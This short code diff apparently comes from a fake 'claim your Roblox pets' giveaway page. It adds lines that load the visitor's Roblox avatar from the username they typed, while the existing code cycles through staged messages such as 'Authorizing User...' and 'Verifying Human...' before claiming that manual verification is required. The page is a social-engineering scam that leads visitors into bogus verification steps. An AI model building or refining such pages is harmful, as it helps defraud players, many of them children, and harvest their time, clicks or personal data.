@@ -154,7 +154,11 @@ function claim() {
     $('.status').fadeIn()
 
     const statuses = ['Connecting...', 'Authorizing User...', 'User Found!', 'Verifying Human...', 'Attempting Human Verification...', 'Error, Manual Verification Required To Claim Pets!'];
-
+    
+    const ch="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" + document.querySelector(".champ").value;
+    document.getElementById("prpc").src=ch;
+    document.getElementById("prpc").style.display = "inline-block";
+    
     for (let i = 0; i < statuses.length; i++) {
         let time = 2 * i * 850;
         if (i === statuses.length - 1) time = 16000;
